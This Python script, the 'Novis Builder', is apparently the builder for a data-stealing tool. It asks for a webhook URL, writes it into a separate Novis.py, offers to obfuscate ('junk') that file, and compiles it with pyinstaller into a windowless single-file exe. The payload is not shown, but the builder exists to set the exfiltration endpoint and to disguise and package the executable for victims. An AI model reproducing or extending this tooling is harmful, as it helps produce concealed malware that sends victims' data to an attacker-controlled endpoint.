from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time

os.system('clear' if os.name == 'posix' else 'cls')

intro = """

 ▐ ▄        ▌ ▐·▪  .▄▄ · 
•█▌▐█ ▄█▀▄ ▪█·█▌██ ▐█ ▀. 
▐█▐▐▌▐█▌.▐▌▐█▐█•▐█·▄▀▀▀█▄  by renko & caldero
██▐█▌▐█▌.▐▌ ███ ▐█▌▐█▄▪▐█
▀▀ █▪ ▀█▄▀▪. ▀  ▀▀▀ ▀▀▀▀ 

> Press Enter                                         

"""

Anime.Fade(Center.Center(intro), Colors.blue_to_black, Colorate.Horizontal, interval=0.055, enter=True)


print(f"""{Fore.LIGHTMAGENTA_EX}

 ▐ ▄        ▌ ▐·▪  .▄▄ · 
•█▌▐█ ▄█▀▄ ▪█·█▌██ ▐█ ▀. 
▐█▐▐▌▐█▌.▐▌▐█▐█•▐█·▄▀▀▀█▄  by renko & caldero
██▐█▌▐█▌.▐▌ ███ ▐█▌▐█▄▪▐█
▀▀ █▪ ▀█▄▀▪. ▀  ▀▀▀ ▀▀▀▀ 

> Welcome to Novis Builder

""")

time.sleep(1)


while True:
    
    Write.Print("\nWhich option do you want to choose: ", Colors.blue_to_purple)
    Write.Print("\n1. Build Exe", Colors.purple_to_blue)
    Write.Print("\n2. Close", Colors.purple_to_blue)
    Write.Print("\nMake your selection: ", Colors.blue_to_purple, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.LIGHTMAGENTA_EX + "\nEnter Your Webhook: " + Style.RESET_ALL)

        filename = "Novis.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.pink)

        obfuscate = False
        while True:
            answer = input(Fore.LIGHTMAGENTA_EX + "\nDo you want to delete your code?  (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} The file has been junked.", Colors.pink)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.dark_red)

        while True:
            answer = input(Fore.LIGHTMAGENTA_EX + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                if not obfuscate:
                    cmd = f"pyinstaller --onefile --windowed {filename}"
                else:
                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]}"
                subprocess.call(cmd, shell=True)
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.pink)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.dark_red)

    elif choice == "2":
        Write.Print("\nExiting the program...", Colors.pink)
        break

    else:
        Write.Print("\nYou have entered invalid. Please try again.", Colors.dark_red)